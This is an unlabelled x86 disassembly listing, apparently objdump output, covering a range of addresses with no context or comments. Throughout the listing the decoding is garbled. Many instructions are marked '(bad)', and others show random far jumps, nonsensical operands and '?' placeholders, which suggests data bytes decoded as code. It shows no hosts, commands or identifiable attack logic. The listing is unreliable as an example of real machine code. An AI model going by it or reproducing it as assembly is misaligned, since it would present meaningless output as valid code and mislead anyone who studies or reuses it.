  4416aa:	pop    eax
  4416ab:	ins    BYTE PTR es:[edi],dx
  4416ac:	push   DWORD PTR [eax+0x55ccff]
  4416b2:	mov    ds:0xbb00d2,eax
  4416b7:	inc    DWORD PTR [ebx]
  4416b9:	mov    DWORD PTR [eax-0xf],ebp
  4416bc:	or     DWORD PTR [ecx],0xffffffff
  4416bf:	mov    DWORD PTR [esi+0x86f2ff],esp
  4416c5:	sbb    eax,DWORD PTR [ebx-0x33ff3900]
  4416cb:	and    al,BYTE PTR [eax]
  4416cd:	jmp    0xca0f:0xffb4ff00
  4416d4:	(bad)  
  4416d5:	stc    
  4416d6:	inc    DWORD PTR [eax]
  4416d8:	add    BYTE PTR cs:[ebp-0x47c1c],ch
  4416df:	add    cl,cl
  4416e1:	add    bl,dh
  4416e3:	(bad)
  4416e6:	add    bh,bh
  4416e8:	arpl   di,di
  4416ea:	ds mov ch,0xcc
  4416ed:	jge    0x441678
  4416ef:	add    dl,bl
  4416f1:	jmp    FWORD PTR [ebp+0x10]
  4416f4:	(bad)  
  4416f5:	cmp    BYTE PTR [eax],al
  4416f7:	add    BYTE PTR [esi],ch
  4416f9:	xor    DWORD PTR [ebp+0x7e],0x0
  4416fd:	sub    edi,edi
  4416ff:	sub    esi,0xffffff89
  441702:	leave  
  441703:	test   al,0xff
  441705:	sbb    al,0x0
  441707:	jmp    DWORD PTR [edi+0xa8deff]
  44170d:	inc    edx
  44170e:	(bad)  
  44170f:	dec    DWORD PTR [esi]
  441711:	and    DWORD PTR [ecx],0x68
  441714:	call   DWORD PTR [edi]
  441716:	int3   
  441717:	add    BYTE PTR [edx],dh
  441719:	jmp    DWORD PTR [ebp+0x65]
  44171c:	jmp    FWORD PTR ds:0x2683ff
  441722:	mov    WORD PTR [ebx-0x1],gs
  441725:	sar    edi,1
  441727:	jmp    DWORD PTR [edi+0x0]
  44172a:	pop    ebp
  44172b:	push   edx
  44172c:	call   DWORD PTR [ebx]
  44172e:	dec    esp
  441730:	xchg   esi,eax
  441731:	push   ecx
  441733:	mov    eax,ds:0xff5ccc
  441738:	or     eax,0xff42f900
  44173d:	push   ebx
  44173e:	inc    DWORD PTR [eax]
  441740:	mov    bl,0xff
  441742:	aad    0x26
  441744:	and    DWORD PTR [ebx-0xf00001],0x5a
  44174b:	jbe    0x44174c
  44174d:	cli    
  44174e:	(bad)  
  44174f:	(bad)  
  441750:	cmp    al,0xcc
  441752:	cwde   
  441753:	jl     0x441755
  441755:	adc    al,0xff
  441757:	or     DWORD PTR [ebx],0x0
  44175a:	push   edx
  44175b:	pushf  
  44175c:	add    dh,bh
  44175e:	int3   
  44175f:	mov    DWORD PTR [eax+eax*1+0x2900da00],ebp
  441766:	add    BYTE PTR [eax],al
  441768:	mov    al,0xff
  44176a:	mov    bl,0x7c
  44176c:	call   FWORD PTR ds:0xcdffff
  441772:	(bad)  
  441773:	pop    eax
  441774:	add    BYTE PTR ds:0xcc3fff00,cl
  44177a:	jle    0x441753
  44177c:	add    dh,cl
  44177e:	(bad)  
  44177f:	call   DWORD PTR [ebx+0x0]
  441782:	enter  0xff83,0xfa
  441786:	add    DWORD PTR [ebx-0x514c33c9],0xffffffff
  44178d:	or     cl,ah
  44178f:	int3   
  441790:	sahf   
  441791:	add    BYTE PTR [edi],al
  441793:	stos   BYTE PTR es:[edi],al
  441794:	add    ah,dh
  441796:	(bad)  
  441797:	call   edx
  441799:	mov    DWORD PTR [ecx-0x1e],eax
  44179c:	xor    DWORD PTR [edx-0x1],0x0
  4417a0:	pop    esp
  4417a1:	add    BYTE PTR [ecx-0x76090046],ah
  4417a7:	dec    DWORD PTR [esi+0x0]
  4417aa:	xor    al,0x16
  4417ac:	(bad)  
  4417ad:	jle    0x441732
  4417af:	inc    DWORD PTR [ebx]
  4417b1:	int3   
  4417b2:	mov    dh,0x38
  4417b4:	add    BYTE PTR [eax-0xb7601],ah
  4417ba:	xchg   edx,eax
  4417bb:	stos   BYTE PTR es:[edi],al
  4417bc:	add    BYTE PTR [ebx-0x1],dh
  4417bf:	(bad)  
  4417c0:	cmp    bh,bh
  4417c2:	fld    QWORD PTR [esi-0x1]
  4417c5:	push   cs
  4417c6:	inc    DWORD PTR [eax]
  4417c8:	test   al,0x0
  4417ca:	xchg   BYTE PTR [esi],dl
  4417cc:	inc    DWORD PTR [edi]
  4417ce:	inc    DWORD PTR [eax]
  4417d0:	mov    ah,0x0
  4417d2:	test   eax,0x780073
  4417d7:	xor    DWORD PTR [edi],0xffffff89
  4417da:	retf   
  4417db:	stc    
  4417dc:	add    BYTE PTR [edx],dl
  4417de:	inc    DWORD PTR [eax]
  4417e0:	mov    ds:0xff3a1cff,eax
  4417e5:	das    
  4417e6:	add    DWORD PTR [eax],0x72
  4417e9:	int3   
  4417ea:	push   esp
  4417eb:	repnz add DWORD PTR [edx],0xffffffff
  4417ef:	int3   
  4417f0:	mov    eax,ds:0xff347100
  4417f5:	pop    es
  4417f6:	add    bh,bh
  4417f8:	pop    ebp
  4417f9:	jmp    FWORD PTR [eax+0xd800f3]
  4417ff:	xor    DWORD PTR [edx-0x1],0x3e
  441803:	(bad)  
  441804:	dec    DWORD PTR [esi+0xa8ffff]
  44180a:	and    ah,BYTE PTR [esi+0x0]
  44180d:	pop    ds
  44180e:	(bad)  
  44180f:	call   eax
  441811:	dec    DWORD PTR ds:0xff07ffb1
  441817:	push   DWORD PTR [edi-0xe04d01]
  44181d:	cmp    edi,edi
  44181f:	(bad)  
  441820:	fmul   st(4),st
  441822:	je     0x435328
  441828:	jge    0x44182a
  44182a:	mov    ds:0xffad8911,eax
  44182f:	inc    DWORD PTR [edi+edi*8-0x51]
  441833:	jge    0x441834
  441835:	test   al,0x89
  441837:	call   FWORD PTR [edi+0x0]
  44183a:	and    al,0x8e
  44183c:	call   DWORD PTR [ebx]
  44183e:	add    ah,cl
  441840:	add    eax,0x838956ff
  441845:	jmp    0xfe93:0xffdaccff
  44184c:	jmp    FWORD PTR [edi+0x0]
  44184f:	add    BYTE PTR [ebp-0x33a01901],ch
  441855:	mov    esi,0xffd9ffff
  44185a:	data16 inc BYTE PTR [ebx+0x3f000079]
  441861:	xor    DWORD PTR [ecx-0x7f],0xffffff83
  441865:	(bad)  
  441867:	inc    DWORD PTR [ebx-0x7c2def77]
  44186d:	and    bh,bh
  44186f:	inc    DWORD PTR [ecx-0x93eb01]
  441875:	loope  0x441876
  441877:	add    BYTE PTR [edx],ch
  441879:	dec    DWORD PTR [ebx]
  44187b:	mov    ebp,0xffffc1ff
  441880:	inc    ebp
  441881:	add    BYTE PTR [ecx-0x72],al
  441884:	mov    DWORD PTR [edi+edi*8+0x0],esp
  441888:	inc    esp
  441889:	(bad)  
  44188a:	push   DWORD PTR ds:0x2fff
  441890:	das    
  441891:	add    dh,bh
  441893:	inc    edi
  441894:	add    BYTE PTR [edi+edi*8],cl
  441897:	inc    esp
  441899:	add    BYTE PTR [ebx],al
  44189b:	xchg   edi,edi
  44189d:	adc    al,0x83
  44189f:	and    ecx,0xffffffff
  4418a2:	or     eax,0x740088
  4418a7:	add    bl,dl
  4418a9:	add    BYTE PTR [ebx-0x5c],dh
  4418ac:	int3   
  4418ad:	rol    DWORD PTR [ebx+0x40011ff],0xf3
  4418b4:	mov    DWORD PTR [edi+0xf58300],ebp
  4418ba:	aaa    
  4418bb:	mov    ah,0xff
  4418bd:	test   DWORD PTR [ebx-0x4dff9f00],eax
  4418c3:	fdiv   st(7),st
  4418c5:	jne    0x4418c7
  4418c7:	add    bl,al
  4418c9:	add    dl,bl
  4418cb:	cmp    bh,0xc7
  4418ce:	inc    DWORD PTR [eax]
  4418d0:	aad    0x0
  4418d2:	push   esp
  4418d3:	mov    al,0xff
  4418d5:	xchg   ebp,eax
  4418d6:	(bad)  
  4418d7:	call   FWORD PTR [ecx-0x33b90c01]
  4418dd:	nop
  4418de:	inc    DWORD PTR [eax]
  4418e0:	cmp    edi,edi
  4418e2:	jnp    0x4418cf
  4418e4:	add    BYTE PTR [edx+0xcdff83],bl
  4418ea:	out    0xf3,eax
  4418ec:	add    BYTE PTR [edi+edi*8],ah
  4418ef:	(bad)  
  4418f0:	fild   DWORD PTR [eax]
  4418f2:	adc    ecx,DWORD PTR [eax-0x7d]
  4418f5:	xchg   BYTE PTR [eax],al
  4418f7:	mov    DWORD PTR [ebx],esp
  4418f9:	int3   
  4418fa:	arpl   WORD PTR [ebp-0xff0100],sp
  441900:	xor    eax,0xff462e00
  441905:	pop    ss
  441906:	add    DWORD PTR [eax],0xffffff8e
  441909:	add    BYTE PTR ds:0xff47ffce,dh
  44190f:	(bad)  
  441910:	jp     0x441912
  441912:	imul   ecx,DWORD PTR [eax+eax*1+0x4b000013],0xffdd45ff
  44191d:	cmp    eax,DWORD PTR [ebx+0x33009200]
  441923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441924:	(bad)  
  441925:	jns    0x4418aa
  441927:	inc    DWORD PTR [edi-0x1]
  44192a:	cs mov esi,0xffccecff
  441930:	fiadd  WORD PTR [eax]
  441932:	ja     0x44193d
  441934:	mov    eax,eax
  441936:	or     esp,0x8
  441939:	add    BYTE PTR [eax],dl
  44193b:	xchg   ecx,eax
  44193c:	int3   
  44193d:	and    cl,BYTE PTR [ecx-0x3000d001]
  441943:	cmp    al,0x0
  441945:	aad    0x0
  441947:	int3   
  441948:	daa    
  441949:	(bad)  
  44194a:	jmp    0x44192f
  44194c:	add    bh,bl
  44194e:	add    DWORD PTR [ebx+0x3afb0031],0x0
  441955:	xchg   ebp,eax
  441956:	add    DWORD PTR [eax],0xffffffec
  441959:	add    BYTE PTR [eax],ah
  44195b:	ins    DWORD PTR es:[edi],dx
  44195c:	push   DWORD PTR [edx+0x94ffff]
  441962:	mov    cl,0x53
  441964:	add    bh,ah
  441966:	add    bh,bh
  441968:	ror    DWORD PTR [ecx+0x790023ef],cl
  44196e:	add    BYTE PTR [eax],al
  441970:	add    BYTE PTR [ebx+0x3800bdf9],0x0
  441977:	adc    DWORD PTR [eax],0x0
  44197a:	add    al,0xc1
  44197c:	add    BYTE PTR [ecx-0x20ff01],cl
  441982:	test   BYTE PTR [ebx],dh
  441984:	add    BYTE PTR [edx-0x1],al
  441987:	add    BYTE PTR [eax-0x1],cl
  44198a:	jne    0x441961
  44198c:	inc    DWORD PTR [ecx-0xcdff01]
  441992:	test   al,0x7a
  441994:	(bad)  
  441995:	clc    
  441996:	inc    DWORD PTR [ebx+0x71dc897b]
  44199c:	call   FWORD PTR [ebx]
  44199e:	mov    esp,ecx
  4419a0:	in     al,0x0
  4419a2:	adc    bl,BYTE PTR [edx-0x76ff1400]
  4419a8:	sbb    bh,bh
  4419aa:	in     eax,0x44
  4419ac:	add    BYTE PTR [ecx],dl
  4419ae:	(bad)  
  4419af:	inc    ebp
  4419b1:	dec    edi
  4419b3:	std    
  4419b4:	add    BYTE PTR [eax-0x1],dh
  4419b7:	xor    DWORD PTR [eax+eax*1],0xffffffec
  4419bb:	mov    dh,0xff
  4419bd:	push   ds
  4419be:	inc    DWORD PTR [ebx+0x30aeffb9]
  4419c4:	add    bh,ah
  4419c6:	dec    esp
  4419c8:	add    BYTE PTR cs:[edx-0x1e],cl
  4419cc:	sbb    DWORD PTR [ecx+0xb7ff83],0xffffff91
  4419d3:	add    DWORD PTR [ebx-0x120033f6],0xff93cfff
  4419dd:	jecxz  0x4419df
  4419df:	add    BYTE PTR [eax],dl
  4419e1:	push   DWORD PTR [esi-0x764b00f6]
  4419e7:	jmp    FWORD PTR [ecx+ecx*4+0x2a83fbb9]
  4419ee:	(bad)  
  4419ef:	call   DWORD PTR [ecx+ecx*4-0x3affa57b]
  4419f6:	add    bh,bh
  4419f8:	cmc    
  4419f9:	mov    ebp,ecx
  4419fb:	and    BYTE PTR [eax],al
  4419fd:	(bad)  
  4419fe:	(bad)  
  4419ff:	dec    DWORD PTR [edx-0x34]
  441a02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441a03:	mov    edi,?
  441a05:	mov    cl,0x0
  441a07:	(bad)  
  441a08:	fiadd  WORD PTR [eax]
  441a0a:	fisttp QWORD PTR [esi]
  441a0c:	jmp    DWORD PTR ds:0xff16ffff
  441a12:	test   BYTE PTR [edi+edi*8+0x18],dl
  441a16:	add    bh,bh
  441a18:	sub    DWORD PTR [eax],eax
  441a1a:	sbb    bh,cl
  441a1c:	adc    esi,0xffffffff
  441a1f:	add    BYTE PTR [ebp+0x0],cl
  441a22:	push   esp
  441a23:	(bad)  
  441a25:	xchg   ebp,eax
  441a26:	(bad)  
  441a27:	push   DWORD PTR [ebp-0xefed01]
  441a2d:	sub    al,0xcc
  441a2f:	call   FWORD PTR [ecx+ecx*4+0x4d]
  441a33:	push   ebx
  441a34:	call   FWORD PTR [edx+0x0]
  441a37:	(bad)  
  441a38:	jle    0x441a3a
  441a3a:	xchg   edi,eax
  441a3b:	mov    eax,DWORD PTR [ebx+0x7c83004e]
  441a41:	mov    DWORD PTR [edi],ebx
  441a43:	inc    edx
  441a44:	call   DWORD PTR [ecx-0x1]
  441a47:	or     DWORD PTR [esi-0x7d],0x6
  441a4b:	push   0xffffffff
  441a4d:	inc    esi
  441a4e:	add    ah,cl
  441a50:	and    edi,edi
  441a52:	xor    BYTE PTR [eax],bh
  441a54:	dec    DWORD PTR [ecx-0xc77c7d]
  441a5a:	in     al,0xc0
  441a5c:	(bad)  
  441a5d:	jmp    0x441a5f
  441a5f:	(bad)  
  441a60:	mov    ebx,0xff930600
  441a65:	imul   eax,DWORD PTR [ebx+0x4400f883],0x3a
  441a6c:	mov    DWORD PTR [edi+edi*8],eax
  441a6f:	int3   
  441a70:	push   esi
  441a71:	add    BYTE PTR [eax],ch
  441a73:	xchg   ebp,eax
  441a74:	int3   
  441a75:	lods   al,BYTE PTR ds:[esi]
  441a76:	cmp    edi,0xffffff99
  441a79:	add    BYTE PTR [edx-0x8200f0],ah
  441a7f:	mov    DWORD PTR [edi+0x0],esi
  441a82:	inc    edx
  441a83:	mov    ecx,0x83c1ff
  441a88:	in     eax,dx
  441a89:	and    DWORD PTR [edi],0xffffffc2
  441a8c:	add    ah,bl
  441a8e:	add    BYTE PTR [eax],al
  441a90:	imul   edi,edi,0x75
  441a93:	jmp    0xffd5:0xff00c5ff
  441a9a:	jo     0x441acd
  441a9c:	cmp    edx,0xffffffff
  441a9f:	add    BYTE PTR [eax],bl
  441aa1:	(bad)  
  441aa2:	cld    
  441aa3:	jmp    0x441aa4
  441aa5:	mov    esp,ecx
  441aa7:	mov    esp,esp
  441aa9:	add    BYTE PTR [ecx+0x6d00bc],dh
  441aaf:	int3   
  441ab0:	mov    esi,0xff932fff
  441ab5:	in     al,0xff
  441ab7:	push   eax
  441ab9:	add    BYTE PTR [ebp-0x1d],cl
  441abc:	dec    DWORD PTR [ecx]
  441abe:	mov    edi,edi
  441ac0:	mov    edx,0xff9ef7ff
  441ac5:	js     0x441ac6
  441ac7:	call   FWORD PTR [ebx+0x8cc700]
  441acd:	dec    edi
  441ace:	(bad)  
  441acf:	(bad)  
  441ad0:	fdivp  st(7),st
  441ad2:	and    eax,0x8326ffd2
  441ad7:	jmp    FWORD PTR [eax+eax*1-0x1276ddca]
  441ade:	dec    esp
  441ae0:	std    
  441ae1:	inc    ecx
  441ae3:	cmp    al,0x0
  441ae5:	sub    al,BYTE PTR [ebx+0x5bff8583]
  441aeb:	das    
  441aec:	and    DWORD PTR [edi],0xffffffff
  441aef:	push   DWORD PTR [ecx+ecx*4]
  441af2:	inc    ecx
  441af3:	sub    eax,0xffff8a00
  441af8:	mov    bh,0x0
  441afa:	icebp  
  441afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441afc:	call   FWORD PTR [ebx-0x7c0a0000]
  441b02:	cwde   
  441b03:	add    edi,edi
  441b05:	repz dec esp
  441b08:	aam    0x83
  441b0a:	mov    bl,0xc0
  441b0c:	add    bh,bl
  441b0e:	(bad)  
  441b0f:	call   DWORD PTR [esi]
  441b11:	add    BYTE PTR [edi-0x46ff04],cl
  441b17:	add    BYTE PTR [ecx-0x1ea877],dh
  441b1d:	xchg   esi,eax
  441b1e:	dec    DWORD PTR [ecx+0x5449ff21]
  441b24:	and    DWORD PTR [esi-0x7d],0xffffffff
  441b28:	popf   
  441b29:	jmp    FWORD PTR [ebx-0x1b]
  441b2c:	int3   
  441b2d:	add    eax,0xffb400ff
  441b32:	xchg   esp,eax
  441b33:	push   ebx
  441b34:	jmp    FWORD PTR [edi+0x0]
  441b37:	add    BYTE PTR [edi-0x1],dh
  441b3a:	jecxz  0x441b7f
  441b3c:	int3   
  441b3d:	rol    DWORD PTR [eax],1
  441b3f:	jmp    DWORD PTR [edx-0x1d3f77]
  441b45:	mov    edi,0xff89cc00
  441b4a:	sub    dl,BYTE PTR [ebx+eax*4+0x76ff8912]
  441b51:	(bad)  
  441b52:	jmp    0x5d00:0xffd00080
  441b59:	int3   
  441b5a:	outs   dx,BYTE PTR ds:[esi]
  441b5b:	(bad)  
  441b5c:	call   FWORD PTR [edi+edi*8+0x0]
  441b60:	mov    edi,edi
  441b62:	out    dx,eax
  441b63:	push   es
  441b64:	add    BYTE PTR ds:0xffcaffcc,dl
  441b6a:	or     BYTE PTR [ebx-0x34],dh
  441b6d:	mov    ecx,0x8376ff83
  441b72:	sbb    eax,0xe7ff2a
  441b77:	push   DWORD PTR ds:0xcaaa00
  441b7d:	iret   
  441b7e:	(bad)  
  441b7f:	inc    DWORD PTR [eax-0x34]
  441b82:	lock stc 
  441b84:	int3   
  441b85:	jbe    0x441b10
  441b87:	mov    DWORD PTR [ebp+0xf51d89],eax
  441b8d:	adc    al,0xff
  441b8f:	jmp    FWORD PTR [ecx-0x331b5d01]
  441b95:	inc    DWORD PTR fs:[ebx+0x15e2ff56]
  441b9c:	(bad)  
  441b9d:	fld    DWORD PTR [ebx+0x31ff6fff]
  441ba3:	or     al,BYTE PTR [eax]
  441ba5:	ret    
  441ba6:	mov    DWORD PTR [ebx+0x634389f8],eax
  441bac:	add    DWORD PTR [ecx],0x0
  441baf:	push   ebx
  441bb1:	add    dl,bl
  441bb3:	and    eax,0xff3989
  441bb8:	(bad)  
  441bbb:	cmp    ah,cl
  441bbd:	stos   BYTE PTR es:[edi],al
  441bbe:	add    BYTE PTR [ecx+0x380dff5f],cl
  441bc4:	mov    DWORD PTR [edi+edi*8-0x7d],ebp
  441bc8:	pop    edx
  441bc9:	push   esp
  441bcb:	mov    ebp,0xffc383
  441bd0:	dec    ecx
  441bd1:	add    BYTE PTR [esi],bh
  441bd3:	inc    esp
  441bd4:	int3   
  441bd5:	popa   
  441bd6:	add    bh,bh
  441bd8:	stos   BYTE PTR es:[edi],al
  441bd9:	push   esi
  441bdb:	dec    ecx
  441bdc:	call   ecx
  441bde:	(bad)  
  441bdf:	dec    DWORD PTR [ebx+eax*4-0x3900a619]
  441be6:	add    BYTE PTR [ecx+0x36fbfff6],cl
  441bec:	call   DWORD PTR [esi+0xe9ff89]
  441bf2:	call   0x99f2a
  441bf7:	mov    DWORD PTR [ebp-0xc4db01],ebx
  441bfd:	inc    eax
  441bfe:	dec    DWORD PTR [ecx+0x1258ff02]
  441c04:	mov    ebp,ebp
  441c06:	mov    edi,edi
  441c08:	scas   eax,DWORD PTR es:[edi]
  441c09:	add    BYTE PTR [eax],bl
  441c0b:	lds    ecx,FWORD PTR [ecx-0x7767cf5]
  441c11:	push   DWORD PTR [esi-0x29]
  441c14:	push   DWORD PTR [ecx-0xa3007d]
  441c1a:	out    0x1d,al
  441c1c:	jmp    DWORD PTR [eax+eax*1-0x1]
  441c20:	out    0x0,al
  441c22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441c23:	sbb    eax,0xffccc5cc
  441c28:	mov    ?,edi
  441c2a:	stos   BYTE PTR es:[edi],al
  441c2b:	adc    BYTE PTR [ebx+0x50ffcca5],al
  441c31:	push   ebx
  441c33:	or     eax,DWORD PTR [ebx+0x3bff001a]
  441c39:	add    bl,al
  441c3b:	mov    cl,0xff
  441c3d:	pop    DWORD PTR [ebx-0x3e33d101]
  441c43:	jns    0x441bc8
  441c45:	sbb    eax,0x9bff00
  441c4a:	ret    
  441c4b:	ret    
  441c4c:	add    BYTE PTR [eax-0x77],cl
  441c4f:	int3   
  441c50:	out    0xff,eax
  441c52:	xchg   ecx,eax
  441c54:	add    BYTE PTR [ebp-0x7c570077],al
  441c5a:	mov    edi,0x83b6008e
  441c5f:	inc    ebx
  441c61:	add    BYTE PTR [eax],ah
  441c63:	pop    edi
  441c64:	add    dh,bh
  441c66:	add    DWORD PTR [eax],0xffffffa0
  441c69:	jmp    DWORD PTR ds:0xff03ff3e
  441c6f:	add    ch,bh
  441c71:	add    BYTE PTR [ecx],bl
  441c73:	jns    0x441c75
  441c75:	cdq    
  441c76:	int3   
  441c77:	(bad)  
  441c78:	mov    eax,0xff4cf200
  441c7d:	cmp    bh,bh
  441c7f:	int3   
  441c80:	aaa    
  441c81:	and    esp,0xffffffa5
  441c84:	int3   
  441c85:	adc    bh,bh
  441c87:	add    BYTE PTR [ebx-0x1],ah
  441c8a:	daa    
  441c8b:	mov    ah,0x83
  441c8d:	fimul  DWORD PTR [ecx+0x68004bff]
  441c93:	or     eax,0x83c6ff
  441c98:	mov    edi,0x93dff
  441c9d:	push   esp
  441c9e:	inc    DWORD PTR [eax]
  441ca0:	jmp    0xffc0:0xff5f9d00
  441ca7:	int3   
  441ca8:	outs   dx,BYTE PTR ds:[esi]
  441ca9:	add    BYTE PTR [eax],ch
  441cab:	inc    ebx
  441cac:	call   FWORD PTR [eax-0x5d0100]
  441cb2:	test   DWORD PTR [ebp+0x0],0x29ff00fa
  441cb9:	and    DWORD PTR [ecx-0x8f002b],0xffffff83
  441cc0:	push   edx
  441cc1:	jmp    FWORD PTR [eax-0x7400c1]
  441cc7:	add    BYTE PTR [ebp-0x78c97d],al
  441ccd:	xor    eax,0xfffc8383
  441cd2:	jae    0x441d4e
  441cd4:	dec    ecx
  441cd6:	dec    DWORD PTR [ecx-0x297679]
  441cdc:	inc    DWORD PTR [ebx]
  441cde:	inc    DWORD PTR [eax]
  441ce0:	retf   0xec00
  441ce3:	imul   eax,DWORD PTR [eax],0x93ffffa5
  441ce9:	add    BYTE PTR [ebx-0x5433b3],ah
  441cef:	add    bl,ah
  441cf1:	cmp    eax,0x25
  441cf4:	add    BYTE PTR [eax],ch
  441cf6:	(bad)  
  441cf7:	push   DWORD PTR [ebp+0x522bcc]
  441cfd:	outs   dx,BYTE PTR ds:[esi]
  441cfe:	dec    esp
  441d00:	test   DWORD PTR [ebx+0x74832ae3],0xcbffff
  441d0a:	fwait
  441d0b:	(bad)  
  441d0c:	add    BYTE PTR [ebx+eax*4],dh
  441d0f:	sbb    DWORD PTR [eax-0x1],0x44
  441d13:	loope  0x441d14
  441d15:	cmp    edi,0xe6831883
  441d1b:	add    BYTE PTR [eax],0x78
  441d1e:	(bad)  
  441d1f:	inc    esp
  441d21:	add    BYTE PTR [ecx],bl
  441d23:	fild   DWORD PTR [ebx+0x9ffff0e]
  441d29:	add    BYTE PTR [ebp-0x730051],ch
  441d2f:	cmp    DWORD PTR [ebp-0xb9da00],0xfffffff2
  441d36:	inc    DWORD PTR [eax]
  441d38:	cld    
  441d39:	inc    DWORD PTR [ecx]
  441d3b:	mov    edi,0xff8344ff
  441d40:	cmp    eax,0xe18600
  441d45:	out    dx,al
  441d46:	add    BYTE PTR [ecx-0x7a000ee],cl
  441d4c:	dec    ebx
  441d4e:	(bad)  
  441d4f:	call   FWORD PTR [eax-0xa6fe00]
  441d55:	jae    0x441d56
  441d57:	sub    DWORD PTR [edi-0x1],0x1a
  441d5b:	cmp    ah,cl
  441d5d:	push   edi
  441d5e:	inc    DWORD PTR [ebx+0x46c5ff68]
  441d64:	add    BYTE PTR [ecx+ecx*4+0x44005fff],al
  441d6b:	aad    0xff
  441d6d:	popa   
  441d6e:	mov    esp,ecx
  441d70:	pop    es
  441d71:	add    cl,ch
  441d73:	xor    BYTE PTR [ebx-0x1f0000de],al
  441d79:	jmp    FWORD PTR [esi-0x7630ff6e]
  441d7f:	add    BYTE PTR [edx],al
  441d81:	int3   
  441d82:	adc    eax,0x838b005a
  441d87:	(bad)  
  441d88:	jmp    0x441d0d
  441d8a:	sbb    al,BYTE PTR [esi]
  441d8c:	int3   
  441d8d:	test   eax,0xcc83cc
  441d92:	jmp    0xd31cba
  441d97:	jmp    edx
  441d99:	(bad)  
  441d9a:	std    
  441d9b:	dec    ebp
  441d9c:	add    al,bl
  441d9e:	inc    DWORD PTR [eax]
  441da0:	vmovmskps edx,ymm7
  441da4:	mov    ebp,edx
  441da6:	(bad)  
  441da7:	dec    DWORD PTR [edx-0x7c0e7001]
  441dad:	and    eax,0xcc98ffff
  441db2:	mov    ch,ah
  441db4:	(bad)  
  441db5:	jp     0x441db7
  441db7:	dec    ebx
  441db9:	add    ch,cl
  441dbb:	mov    WORD PTR [eax],es
  441dbd:	ds int3 
  441dbf:	mov    ebp,ecx
  441dc1:	add    BYTE PTR [ebx-0x37ca6],bh
  441dc7:	jmp    DWORD PTR [eax-0x54000]
  441dcd:	sar    edi,cl
  441dcf:	call   DWORD PTR [esi+0xe905ff]
  441dd5:	xor    bh,bh
  441dd7:	add    BYTE PTR [ecx],ah
  441dd9:	int3   
  441dda:	jns    0x441db9
  441ddc:	push   esp
  441dde:	mov    edi,edi
  441de0:	mov    eax,ds:0x2574ff
  441de5:	cld    
  441de6:	inc    DWORD PTR [eax]
  441de8:	dec    ecx
  441de9:	mov    DWORD PTR [esi-0x69],ecx
  441dec:	add    BYTE PTR [ebx+eax*4],bl
  441def:	mov    DWORD PTR [ebp-0x199b01],eax
  441df5:	mov    edi,0xa18989
  441dfa:	fmul   QWORD PTR [ebx-0x7d]
  441dfd:	repz int3 
  441dff:	add    BYTE PTR [ecx],cl
  441e01:	jmp    ebx
  441e03:	add    eax,0xff0500
  441e08:	mov    eax,ds:0x89fe7bff
  441e0d:	jne    0x441e0f
  441e0f:	call   DWORD PTR [eax+0x7660ff]
  441e15:	call   0xff901da3
  441e1a:	sbb    al,0x2a
  441e1c:	add    BYTE PTR [ecx],cl
  441e1e:	dec    DWORD PTR [ecx+0x5a680060]
  441e24:	mov    DWORD PTR [ebx+eax*4-0x7d],edx
  441e28:	xlat   BYTE PTR ds:[ebx]
  441e29:	add    bh,ch
  441e2b:	test   eax,0xffccd1ff
  441e30:	gs add bh,cl
  441e33:	in     eax,dx
  441e34:	mov    ecx,edi
  441e36:	(bad)  
  441e37:	push   DWORD PTR [edx-0x1]
  441e3a:	inc    edi
  441e3b:	mov    dh,0xff
  441e3d:	pushf  
  441e3e:	(bad)  
  441e3f:	call   FWORD PTR [eax+0x68f1ff]
  441e45:	adc    eax,DWORD PTR [eax]
  441e47:	inc    ecx
  441e49:	add    BYTE PTR [esi-0xd0049],dh
  441e4f:	mov    DWORD PTR [esi-0x1],ecx
  441e52:	pop    edi
  441e53:	xor    al,0xff
  441e55:	or     bh,bh
  441e57:	jmp    esi
  441e59:	inc    DWORD PTR [ebx-0x850087]
  441e5f:	add    BYTE PTR [ebx-0x54c601],dh
  441e65:	xor    eax,0x83bbffff
  441e6a:	push   edx
  441e6b:	out    dx,al
  441e6c:	(bad)  
  441e6d:	jmp    0xb31df5
  441e72:	ss pop esi
  441e74:	int3   
  441e75:	inc    esp
  441e76:	inc    DWORD PTR [eax]
  441e78:	stos   DWORD PTR es:[edi],eax
  441e79:	(bad)  
  441e7a:	in     al,dx
  441e7b:	pop    esp
  441e7c:	adc    DWORD PTR [esi+0xd2ffff],0xffffffcd
  441e83:	mov    ecx,0x89b5ff
  441e88:	ds (bad) 
  441e8a:	jmp    0xffe91d9c
  441e8f:	inc    DWORD PTR [edi+edi*8+0x35ffc394]
  441e96:	(bad)  
  441e97:	inc    esp
  441e99:	dec    esp
  441e9b:	inc    ebp
  441e9c:	(bad)  
  441e9d:	cld    
  441e9e:	add    BYTE PTR [eax],al
  441ea0:	push   cs
  441ea1:	add    ch,bl
  441ea3:	xchg   edx,eax
  441ea4:	dec    DWORD PTR [edx+0x0]
  441ea7:	add    BYTE PTR [ecx],ch
  441ea9:	add    ah,al
  441eab:	sub    DWORD PTR [ecx+0x40ffff11],ecx
  441eb1:	mov    DWORD PTR [ecx-0x63],ebx
  441eb4:	call   FWORD PTR [edi+edi*8]
  441eb7:	dec    DWORD PTR [ebp-0xe2bb01]
  441ebd:	sbb    edi,edi
  441ebf:	add    BYTE PTR [ebx-0x678b01],ch
  441ec5:	jge    0x441ec7
  441ec7:	mov    ebp,ebx
  441ec9:	add    BYTE PTR [ecx-0x7c0300db],ah
  441ecf:	add    ah,ah
  441ed1:	add    cl,dh
  441ed3:	or     BYTE PTR [ecx+0x338989c5],0xff
  441eda:	jb     0x441ef6
  441edc:	call   esp
  441ede:	dec    DWORD PTR [ecx-0x7e35008d]
  441ee4:	add    BYTE PTR [ecx],al
  441ee6:	inc    DWORD PTR [eax]
  441ee8:	(bad)  
  441ee9:	jmp    DWORD PTR [esi]
  441eeb:	popa   
  441eec:	adc    DWORD PTR ds:0x89f900ff,0xffffff82
  441ef3:	retf   0x86ff
  441ef6:	add    BYTE PTR [eax],al
  441ef8:	ret    
  441ef9:	inc    DWORD PTR [edx]
  441efb:	add    BYTE PTR es:[eax],cl
  441efe:	add    bh,bh
  441f00:	push   ebx
  441f01:	add    BYTE PTR [edx-0x7ca7ffb1],dh
  441f07:	push   DWORD PTR [esi-0x1]
  441f0a:	dec    ebp
  441f0b:	dec    edi
  441f0c:	int3   
  441f0d:	rol    BYTE PTR [eax],1
